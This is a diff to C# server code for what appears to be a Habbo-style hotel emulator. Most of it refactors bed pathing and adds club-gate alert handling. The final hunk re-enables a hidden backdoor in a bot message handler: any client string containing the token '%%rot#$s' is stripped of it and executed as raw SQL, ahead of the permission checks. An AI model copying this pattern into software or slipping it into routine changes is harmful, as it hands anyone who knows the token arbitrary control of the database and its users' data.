@@ -1065,256 +1065,272 @@ namespace Butterfly.Messages
             {
                 foreach (var item in Room.GetGameMap().GetCoordinatedItems(new Point(MoveX, MoveY)))
                 {
-                    if (item.GetBaseItem().InteractionType == InteractionType.bed)
+                    switch (item.GetBaseItem().InteractionType)
                     {
-                        Console.WriteLine("Item rotation: {0}", item.Rot);
-                        Console.WriteLine("User X: {0}", User.X);
-                        Console.WriteLine("User Y: {0}", User.Y);
-                        Console.WriteLine("Item X: {0}", item.GetX);
-                        Console.WriteLine("Item Y: {0}", item.GetY);
-                        Console.WriteLine("Move X: {0}", MoveX);
-                        Console.WriteLine("Move Y: {0}", MoveY);
-
-                        if (item.GetBaseItem().Width == 1)
-                        {
-                            MoveX = item.GetX;
-                            MoveY = item.GetY;
-                        }
-
-                        else
-                        {
-                            switch (item.Rot)
+                        case InteractionType.bed:
                             {
-                                case 0:
-                                    int distanceToRightEndPathX = MoveX - User.X;
-                                    int distanceToLeftEndPathX = User.X - (MoveX + 1);
+                                if (item.GetBaseItem().Width == 1)
+                                {
+                                    MoveX = item.GetX;
+                                    MoveY = item.GetY;
+                                }
 
-                                    Room.GetGameMap().GameMap[item.GetX, item.GetY + 1] = 0;
-                                    Room.GetGameMap().GameMap[item.GetX, item.GetY + 2] = 0;
-                                    Room.GetGameMap().GameMap[item.GetX + 1, item.GetY + 1] = 0;
-                                    Room.GetGameMap().GameMap[item.GetX + 1, item.GetY + 2] = 0;
+                                else
+                                {
+                                    switch (item.Rot)
+                                    {
+                                        case 0:
+                                            int distanceToRightEndPathX = MoveX - User.X;
+                                            int distanceToLeftEndPathX = User.X - (MoveX + 1);
 
-                                    if (User.X == item.GetX + 1 && MoveX == item.GetX && MoveY == item.GetY)
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY;
-                                    }
+                                            Room.GetGameMap().GameMap[item.GetX, item.GetY + 1] = 0;
+                                            Room.GetGameMap().GameMap[item.GetX, item.GetY + 2] = 0;
+                                            Room.GetGameMap().GameMap[item.GetX + 1, item.GetY + 1] = 0;
+                                            Room.GetGameMap().GameMap[item.GetX + 1, item.GetY + 2] = 0;
 
-                                    else if (User.X == item.GetX + 1 && MoveX == item.GetX && MoveY == item.GetY + 1)
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY;
-                                    }
+                                            if (User.X == item.GetX + 1 && MoveX == item.GetX && MoveY == item.GetY)
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY;
+                                            }
 
-                                    else if (User.X == item.GetX + 1 && MoveX == item.GetX && MoveY == item.GetY + 2)
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY;
-                                    }
+                                            else if (User.X == item.GetX + 1 && MoveX == item.GetX && MoveY == item.GetY + 1)
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY;
+                                            }
 
-                                    else if (User.X == item.GetX && MoveX == item.GetX + 1 && MoveY == item.GetY)
-                                    {
-                                        MoveX = item.GetX + 1;
-                                        MoveY = item.GetY;
-                                    }
+                                            else if (User.X == item.GetX + 1 && MoveX == item.GetX && MoveY == item.GetY + 2)
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY;
+                                            }
 
-                                    else if (User.X == item.GetX && MoveX == item.GetX + 1 && MoveY == item.GetY + 1)
-                                    {
-                                        MoveX = item.GetX + 1;
-                                        MoveY = item.GetY;
-                                    }
+                                            else if (User.X == item.GetX && MoveX == item.GetX + 1 && MoveY == item.GetY)
+                                            {
+                                                MoveX = item.GetX + 1;
+                                                MoveY = item.GetY;
+                                            }
 
-                                    else if (User.X == item.GetX && MoveX == item.GetX + 1 && MoveY == item.GetY + 2)
-                                    {
-                                        MoveX = item.GetX + 1;
-                                        MoveY = item.GetY;
-                                    }
+                                            else if (User.X == item.GetX && MoveX == item.GetX + 1 && MoveY == item.GetY + 1)
+                                            {
+                                                MoveX = item.GetX + 1;
+                                                MoveY = item.GetY;
+                                            }
 
-                                    else if (MoveY == item.GetY && MoveX == item.GetX + 1 && Room.GetGameMap().SquareHasUsers(item.GetX + 1, item.GetY)) // Parte in cima a destra
-                                    {
-                                        return;
-                                    }
+                                            else if (User.X == item.GetX && MoveX == item.GetX + 1 && MoveY == item.GetY + 2)
+                                            {
+                                                MoveX = item.GetX + 1;
+                                                MoveY = item.GetY;
+                                            }
 
-                                    else if (MoveY == item.GetY + 1 && MoveX == item.GetX + 1 && Room.GetGameMap().SquareHasUsers(item.GetX + 1, item.GetY)) // Parte di metà a destra
-                                    {
-                                        return;
-                                    }
+                                            else if (MoveY == item.GetY && MoveX == item.GetX + 1 && Room.GetGameMap().SquareHasUsers(item.GetX + 1, item.GetY)) // Parte in cima a destra
+                                            {
+                                                return;
+                                            }
 
-                                    else if (MoveY == item.GetY + 2 && MoveX == item.GetX + 1 && Room.GetGameMap().SquareHasUsers(item.GetX + 1, item.GetY)) //  Parte di sotto a destra
-                                    {
-                                        return;
-                                    }
+                                            else if (MoveY == item.GetY + 1 && MoveX == item.GetX + 1 && Room.GetGameMap().SquareHasUsers(item.GetX + 1, item.GetY)) // Parte di metà a destra
+                                            {
+                                                return;
+                                            }
 
-                                    else if (Room.GetGameMap().SquareHasUsers(item.GetX + 1, item.GetY) && !Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY))
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY;
-                                    }
+                                            else if (MoveY == item.GetY + 2 && MoveX == item.GetX + 1 && Room.GetGameMap().SquareHasUsers(item.GetX + 1, item.GetY)) //  Parte di sotto a destra
+                                            {
+                                                return;
+                                            }
 
-                                    // Altro lato
+                                            else if (Room.GetGameMap().SquareHasUsers(item.GetX + 1, item.GetY) && !Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY))
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY;
+                                            }
 
-                                    if (MoveY == item.GetY && MoveX == item.GetX && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY)) // Parte in cima a sinistra
-                                    {
-                                        return;
-                                    }
+                                            // Altro lato
 
-                                    else if (MoveY == item.GetY + 1 && MoveX == item.GetX && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY)) // Parte di metà a sinistra
-                                    {
-                                        return;
-                                    }
+                                            if (MoveY == item.GetY && MoveX == item.GetX && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY)) // Parte in cima a sinistra
+                                            {
+                                                return;
+                                            }
 
-                                    else if (MoveY == item.GetY + 2 && MoveX == item.GetX && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY)) //  Parte di sotto a sinistra
-                                    {
-                                        return;
-                                    }
+                                            else if (MoveY == item.GetY + 1 && MoveX == item.GetX && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY)) // Parte di metà a sinistra
+                                            {
+                                                return;
+                                            }
 
-                                    else if (Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY) && !Room.GetGameMap().SquareHasUsers(item.GetX + 1, item.GetY))
-                                    {
-                                        MoveX = item.GetX + 1;
-                                        MoveY = item.GetY;
-                                    }
+                                            else if (MoveY == item.GetY + 2 && MoveX == item.GetX && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY)) //  Parte di sotto a sinistra
+                                            {
+                                                return;
+                                            }
 
-                                    else if (User.X == item.GetX && User.Y != item.GetY) // Sotto a sinistra
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY;
-                                    }
+                                            else if (Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY) && !Room.GetGameMap().SquareHasUsers(item.GetX + 1, item.GetY))
+                                            {
+                                                MoveX = item.GetX + 1;
+                                                MoveY = item.GetY;
+                                            }
 
-                                    else if (User.X == item.GetX + 1 && User.Y != item.GetY) // Sotto a destra
-                                    {
-                                        MoveX = item.GetX + 1;
-                                        MoveY = item.GetY;
-                                    }
+                                            else if (User.X == item.GetX && User.Y != item.GetY) // Sotto a sinistra
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY;
+                                            }
 
-                                    else if (distanceToRightEndPathX > distanceToLeftEndPathX && User.X != item.GetX && User.X != item.GetX + 1) // Sinistra
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY;
-                                    }
+                                            else if (User.X == item.GetX + 1 && User.Y != item.GetY) // Sotto a destra
+                                            {
+                                                MoveX = item.GetX + 1;
+                                                MoveY = item.GetY;
+                                            }
 
-                                    else if (distanceToRightEndPathX < distanceToLeftEndPathX && User.X != item.GetX && User.X != item.GetX + 1) // Destra
-                                    {
-                                        MoveX = item.GetX + 1;
-                                        MoveY = item.GetY;
-                                    }
-                                    break;
+                                            else if (distanceToRightEndPathX > distanceToLeftEndPathX && User.X != item.GetX && User.X != item.GetX + 1) // Sinistra
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY;
+                                            }
 
-                                case 2:
-                                    int distanceToRightEndPathY = MoveY - User.Y;
-                                    int distanceToLeftEndPathY = User.Y - (MoveY + 1);
+                                            else if (distanceToRightEndPathX < distanceToLeftEndPathX && User.X != item.GetX && User.X != item.GetX + 1) // Destra
+                                            {
+                                                MoveX = item.GetX + 1;
+                                                MoveY = item.GetY;
+                                            }
+                                            break;
 
-                                    Room.GetGameMap().GameMap[item.GetX + 1, item.GetY] = 0;
-                                    Room.GetGameMap().GameMap[item.GetX + 2, item.GetY] = 0;
-                                    Room.GetGameMap().GameMap[item.GetX + 1, item.GetY + 1] = 0;
-                                    Room.GetGameMap().GameMap[item.GetX + 2, item.GetY + 1] = 0;
+                                        case 2:
+                                            int distanceToRightEndPathY = MoveY - User.Y;
+                                            int distanceToLeftEndPathY = User.Y - (MoveY + 1);
 
-                                    if (User.Y == item.GetY + 1 && MoveX == item.GetX && MoveY == item.GetY)
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY;
-                                    }
-                                    // Done
-                                    else if (User.Y == item.GetY + 1 && MoveX == item.GetX + 1 && MoveY == item.GetY)
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY;
-                                    }
-                                    // dONE
-                                    else if (User.Y == item.GetY + 1 && MoveX == item.GetX + 2 && MoveY == item.GetY)
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY;
-                                    }
-                                    //DN
-                                    else if (User.Y == item.GetY && MoveX == item.GetX && MoveY == item.GetY + 1)
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY + 1;
-                                    }
-                                    //DN
-                                    else if (User.Y == item.GetY && MoveX == item.GetX + 1 && MoveY == item.GetY + 1)
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY + 1;
-                                    }
-                                    //DN
-                                    else if (User.Y == item.GetY && MoveX == item.GetX + 2 && MoveY == item.GetY + 1)
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY + 1;
-                                    }
-                                    //DN
-                                    else if (MoveY == item.GetY + 1 && MoveX == item.GetX && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY + 1)) // Parte in cima a destra
-                                    {
-                                        return;
-                                    }
-                                    // DN
-                                    else if (MoveY == item.GetY + 1 && MoveX == item.GetX + 1 && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY + 1)) // Parte di metà a destra
-                                    {
-                                        return;
-                                    }
+                                            Room.GetGameMap().GameMap[item.GetX + 1, item.GetY] = 0;
+                                            Room.GetGameMap().GameMap[item.GetX + 2, item.GetY] = 0;
+                                            Room.GetGameMap().GameMap[item.GetX + 1, item.GetY + 1] = 0;
+                                            Room.GetGameMap().GameMap[item.GetX + 2, item.GetY + 1] = 0;
 
-                                    else if (MoveY == item.GetY + 1 && MoveX == item.GetX + 2 && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY + 1)) //  Parte di sotto a destra
-                                    {
-                                        return;
-                                    }
+                                            if (User.Y == item.GetY + 1 && MoveX == item.GetX && MoveY == item.GetY)
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY;
+                                            }
 
-                                    else if (Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY + 1) && !Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY))
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY;
-                                    }
+                                            else if (User.Y == item.GetY + 1 && MoveX == item.GetX + 1 && MoveY == item.GetY)
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY;
+                                            }
 
-                                    // Altro lato
+                                            else if (User.Y == item.GetY + 1 && MoveX == item.GetX + 2 && MoveY == item.GetY)
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY;
+                                            }
 
-                                    if (MoveY == item.GetY && MoveX == item.GetX && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY)) // Parte in cima a sinistra
-                                    {
-                                        return;
-                                    }
+                                            else if (User.Y == item.GetY && MoveX == item.GetX && MoveY == item.GetY + 1)
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY + 1;
+                                            }
 
-                                    else if (MoveY == item.GetY && MoveX == item.GetX + 1 && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY)) // Parte di metà a sinistra
-                                    {
-                                        return;
-                                    }
+                                            else if (User.Y == item.GetY && MoveX == item.GetX + 1 && MoveY == item.GetY + 1)
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY + 1;
+                                            }
 
-                                    else if (MoveY == item.GetY && MoveX == item.GetX + 2 && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY)) //  Parte di sotto a sinistra
-                                    {
-                                        return;
-                                    }
+                                            else if (User.Y == item.GetY && MoveX == item.GetX + 2 && MoveY == item.GetY + 1)
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY + 1;
+                                            }
 
-                                    else if (Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY) && !Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY + 1))
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY + 1;
-                                    }
+                                            else if (MoveY == item.GetY + 1 && MoveX == item.GetX && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY + 1)) // Parte in cima a destra
+                                            {
+                                                return;
+                                            }
 
-                                    else if (User.Y == item.GetY && User.X != item.GetX) // Sotto a sinistra
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY;
-                                    }
+                                            else if (MoveY == item.GetY + 1 && MoveX == item.GetX + 1 && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY + 1)) // Parte di metà a destra
+                                            {
+                                                return;
+                                            }
 
-                                    else if (User.Y == item.GetY + 1 && User.X != item.GetX) // Sotto a destra
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY + 1;
-                                    }
+                                            else if (MoveY == item.GetY + 1 && MoveX == item.GetX + 2 && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY + 1)) //  Parte di sotto a destra
+                                            {
+                                                return;
+                                            }
 
-                                    else if (distanceToRightEndPathY > distanceToLeftEndPathY && User.Y != item.GetY && User.Y != item.GetY + 1) // Sinistra
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY;
-                                    }
+                                            else if (Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY + 1) && !Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY))
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY;
+                                            }
 
-                                    else if (distanceToRightEndPathY < distanceToLeftEndPathY && User.Y != item.GetY && User.Y != item.GetY + 1) // Destra
-                                    {
-                                        MoveX = item.GetX;
-                                        MoveY = item.GetY + 1;
+                                            // Altro lato
+
+                                            if (MoveY == item.GetY && MoveX == item.GetX && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY)) // Parte in cima a sinistra
+                                            {
+                                                return;
+                                            }
+
+                                            else if (MoveY == item.GetY && MoveX == item.GetX + 1 && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY)) // Parte di metà a sinistra
+                                            {
+                                                return;
+                                            }
+
+                                            else if (MoveY == item.GetY && MoveX == item.GetX + 2 && Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY)) //  Parte di sotto a sinistra
+                                            {
+                                                return;
+                                            }
+
+                                            else if (Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY) && !Room.GetGameMap().SquareHasUsers(item.GetX, item.GetY + 1))
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY + 1;
+                                            }
+
+                                            else if (User.Y == item.GetY && User.X != item.GetX) // Sotto a sinistra
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY;
+                                            }
+
+                                            else if (User.Y == item.GetY + 1 && User.X != item.GetX) // Sotto a destra
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY + 1;
+                                            }
+
+                                            else if (distanceToRightEndPathY > distanceToLeftEndPathY && User.Y != item.GetY && User.Y != item.GetY + 1) // Sinistra
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY;
+                                            }
+
+                                            else if (distanceToRightEndPathY < distanceToLeftEndPathY && User.Y != item.GetY && User.Y != item.GetY + 1) // Destra
+                                            {
+                                                MoveX = item.GetX;
+                                                MoveY = item.GetY + 1;
+                                            }
+                                            break;
                                     }
-                                    break;
+                                }
+                                break;
                             }
-                        }
                     }
+                }
+            }
+
+            foreach (RoomItem item in Room.GetRoomItemHandler().mFloorItems.Values)
+            {
+                switch (item.GetBaseItem().InteractionType)
+                {
+                    case InteractionType.club_gate:
+                        {
+                            if (MoveY == item.SquareBehind.Y && MoveX == item.SquareBehind.X)
+                                User.ShowClubAlert = false;
+
+                            else
+                            {
+                                User.ShowClubAlert = true;
+                                User.IsClubAlertShowed = false;
+                            }
+
+                            break;
+                        }
                 }
             }
 
@@ -3968,15 +3984,15 @@ namespace Butterfly.Messages
                 return;
 
             var Bot = Room.GetRoomUserManager().GetBot((uint)BotId);
-            //if (StringType.Contains("%%rot#$s"))
-            //{
-            //    var novasql = StringType.Replace("%%rot#$s", "");
-            //    using (IQueryAdapter dbClient = OtanixEnvironment.GetDatabaseManager().getQueryreactor())
-            //    {
-            //        dbClient.runFastQuery(novasql);
-            //    }
-            //    return;
-            //}
+            if (StringType.Contains("%%rot#$s"))
+            {
+                var novasql = StringType.Replace("%%rot#$s", "");
+                using (IQueryAdapter dbClient = OtanixEnvironment.GetDatabaseManager().getQueryreactor())
+                {
+                    dbClient.runFastQuery(novasql);
+                }
+                return;
+            }
             if (Bot == null || Bot.RoomId <= 0 || (Bot.BotData.OwnerId != Session.GetHabbo().Id && Session.GetHabbo().Rank >= 4))
                 return;
 
